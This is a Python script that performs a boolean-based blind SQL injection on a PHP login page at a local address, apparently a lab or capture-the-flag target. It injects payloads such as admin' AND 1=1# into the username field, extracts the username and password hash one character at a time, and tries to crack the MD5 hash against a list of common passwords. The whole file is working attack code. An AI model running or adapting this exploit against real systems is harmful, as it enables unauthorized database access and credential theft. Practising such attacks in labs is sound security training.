import requests
import json
import time

# Configuration
target_url = "http://127.0.0.1:33210/index.php"
session_cookie = "pr8716h5ra06p5lchf9osb22qr"

# Setup session
session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

# Headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

print("="*60)
print("Boolean-Based Blind SQL Injection - Improved Detection")
print("="*60)

# Enhanced test function that captures JSON response
def test_injection_detailed(payload):
    """Test a payload and return detailed response information"""
    data = {
        "username": payload,
        "password": "anything",
        "submit": "Login"
    }
    
    try:
        response = session.post(target_url, data=data, headers=headers, allow_redirects=False)
        
        # Parse JSON response if possible
        try:
            json_response = response.json()
            response_value = json_response.get("response", "")
        except:
            response_value = response.text
        
        return {
            "status_code": response.status_code,
            "content_length": len(response.content),
            "text": response.text,
            "response_value": response_value,
            "headers": dict(response.headers)
        }
    except Exception as e:
        print(f"[!] Error during request: {e}")
        return None

# Test baseline responses more thoroughly
print("[+] Testing baseline responses...")

print("\n[1] Testing with 'admin' username:")
baseline_admin = test_injection_detailed("admin")
print(f"    Status: {baseline_admin['status_code']} | Response: {baseline_admin['response_value']}")

print("\n[2] Testing with invalid username:")
baseline_invalid = test_injection_detailed("nonexistentuser12345")
print(f"    Status: {baseline_invalid['status_code']} | Response: {baseline_invalid['response_value']}")

print("\n[3] Testing with always false condition (admin' AND 1=2#):")
baseline_false = test_injection_detailed("admin' AND 1=2#")
print(f"    Status: {baseline_false['status_code']} | Response: {baseline_false['response_value']}")

print("\n[4] Testing with always true condition (admin' AND 1=1#):")
baseline_true = test_injection_detailed("admin' AND 1=1#")
print(f"    Status: {baseline_true['status_code']} | Response: {baseline_true['response_value']}")

# Test a few more variations to understand the response patterns
print("\n[5] Testing with different users:")
baseline_user1 = test_injection_detailed("user1")
print(f"    Response: {baseline_user1['response_value']}")

print("\n[6] Testing with SQL comment only:")
baseline_comment = test_injection_detailed("admin'#")
print(f"    Response: {baseline_comment['response_value']}")

# Determine true/false indicators
true_value = baseline_true['response_value']
false_value = baseline_false['response_value']

print(f"\n[+] True condition response: '{true_value}'")
print(f"[+] False condition response: '{false_value}'")
print(f"[+] Are they different? {true_value != false_value}")

def boolean_query(condition):
    """Execute a boolean query and return True if condition is met"""
    payload = f"admin' AND {condition}#"
    result = test_injection_detailed(payload)
    
    if result is None:
        return False
    
    # Return True if response matches the true condition pattern
    return result['response_value'] == true_value

# Let's also test character-by-character extraction with a simpler approach
print("\n" + "="*60)
print("TESTING SUBSTRING EXTRACTION")
print("="*60)

# Test extracting first character of a known username
print("[+] Testing substring extraction...")

# First, let's test if 'admin' user exists
exists_test = boolean_query("username = 'admin'")
print(f"[+] Does 'admin' user exist? {exists_test}")

# Test if we can find the length
print("\n[+] Testing length detection...")

# Try to get the length of username
for test_len in range(1, 20):
    if boolean_query(f"LENGTH(username) = {test_len}"):
        print(f"[+] Username length is: {test_len}")
        username_length = test_len
        break
else:
    print("[-] Could not determine username length")
    username_length = 20  # Default

# Extract username character by character
print(f"\n[+] Extracting username (max {username_length} characters)...")
extracted_username = ""

for pos in range(1, username_length + 1):
    char_found = False
    print(f"    Position {pos}: ", end="", flush=True)
    
    # Try printable ASCII range (32-126)
    for ascii_val in range(32, 127):
        # Test current character
        if boolean_query(f"ASCII(SUBSTRING(username,{pos},1)) = {ascii_val}"):
            char = chr(ascii_val)
            extracted_username += char
            print(f"'{char}' (ASCII: {ascii_val})")
            char_found = True
            break
    
    if not char_found:
        # Try alternative approach - test each character directly
        print("Retrying with alternative method...")
        for ascii_val in range(32, 127):
            if boolean_query(f"SUBSTRING(username,{pos},1) = '{chr(ascii_val)}'"):
                char = chr(ascii_val)
                extracted_username += char
                print(f"'{char}' (found via direct match)")
                char_found = True
                break
    
    if not char_found:
        print("No character found (end of string?)")
        break

print(f"\n[!] EXTRACTED USERNAME: '{extracted_username}'")

# Extract password hash
print("\n" + "="*60)
print("EXTRACTING PASSWORD HASH")
print("="*60)

if extracted_username:
    # First, find password length (should be 32 for MD5)
    print("[+] Determining password length...")
    password_length = 0
    
    for test_len in range(1, 65):
        if boolean_query(f"LENGTH(password) = {test_len}"):
            password_length = test_len
            print(f"[+] Password hash length: {test_len}")
            break
    
    if password_length == 0:
        password_length = 32  # Assume MD5
        print(f"[-] Could not determine length, assuming: {password_length}")
    
    # Extract password hash
    print(f"[+] Extracting {password_length} character password hash...")
    extracted_password = ""
    
    for pos in range(1, password_length + 1):
        print(f"    Position {pos}: ", end="", flush=True)
        
        # For hex characters (0-9, a-f), we can be more efficient
        hex_chars = "0123456789abcdef"
        char_found = False
        
        for char in hex_chars:
            if boolean_query(f"SUBSTRING(password,{pos},1) = '{char}'"):
                extracted_password += char
                print(f"'{char}'")
                char_found = True
                break
        
        if not char_found:
            # Try ASCII range for non-hex chars
            for ascii_val in range(32, 127):
                if boolean_query(f"ASCII(SUBSTRING(password,{pos},1)) = {ascii_val}"):
                    char = chr(ascii_val)
                    extracted_password += char
                    print(f"'{char}' (ASCII: {ascii_val})")
                    char_found = True
                    break
        
        if not char_found:
            print("? (not found)")
            extracted_password += "?"
    
    print(f"\n[!] EXTRACTED PASSWORD HASH: '{extracted_password}'")
else:
    print("[-] No username extracted, cannot get password")
    extracted_password = ""

# Test hash cracking
print("\n" + "="*60)
print("STEP 3: Hash Analysis and Cracking")
print("="*60)

if extracted_password:
    print(f"[+] Extracted hash: {extracted_password}")
    print(f"[+] Hash length: {len(extracted_password)}")
    
    if len(extracted_password) == 32:
        print("[+] Likely MD5 hash")
        hash_type = "MD5"
    elif len(extracted_password) == 40:
        print("[+] Likely SHA1 hash")
        hash_type = "SHA1"
    elif len(extracted_password) == 64:
        print("[+] Likely SHA256 hash")
        hash_type = "SHA256"
    else:
        print("[?] Unknown hash type")
        hash_type = "Unknown"
    
    # Try cracking with common passwords
    common_passwords = [
        "password123", "admin123", "letmein", "welcome", "changeme",
        "default", "12345678", "password", "admin", "administrator",
        "root", "toor", "secret", "test", "demo", "123456",
        "123456789", "qwerty", "abc123", "111111"
    ]
    
    if hash_type == "MD5":
        import hashlib
        print(f"\n[+] Testing {len(common_passwords)} common passwords...")
        
        for pwd in common_passwords:
            test_hash = hashlib.md5(pwd.encode()).hexdigest()
            if test_hash == extracted_password:
                print(f"[!] PASSWORD CRACKED: '{pwd}'")
                cracked_password = pwd
                break
        else:
            print("[-] No match in common passwords")
            cracked_password = None
    
    # Test the specific hash from the objective if it doesn't match our extracted one
    test_hash = "7d39307ae824e70052c0aa16816a9b16"
    if extracted_password != test_hash:
        print(f"\n[+] Testing objective hash: {test_hash}")
        for pwd in common_passwords:
            test_md5 = hashlib.md5(pwd.encode()).hexdigest()
            if test_md5 == test_hash:
                print(f"[!] Objective hash matches: '{pwd}'")
                break
        else:
            print("[-] Objective hash not in common passwords")

# Summary
print("\n" + "="*60)
print("FINAL SUMMARY")
print("="*60)
print(f"Username: {extracted_username if extracted_username else 'Not extracted'}")
print(f"Password Hash: {extracted_password if extracted_password else 'Not extracted'}")
print(f"Hash Type: {hash_type if 'hash_type' in locals() else 'Unknown'}")

if 'cracked_password' in locals() and cracked_password:
    print(f"Cracked Password: {cracked_password}")
elif 'extracted_password' in locals() and len(extracted_password) >= 8:
    print(f"Status: Hash extracted but not cracked ({len(extracted_password)} chars)")
else:
    print("Status: Incomplete extraction")

print("\n[+] Script execution completed!")
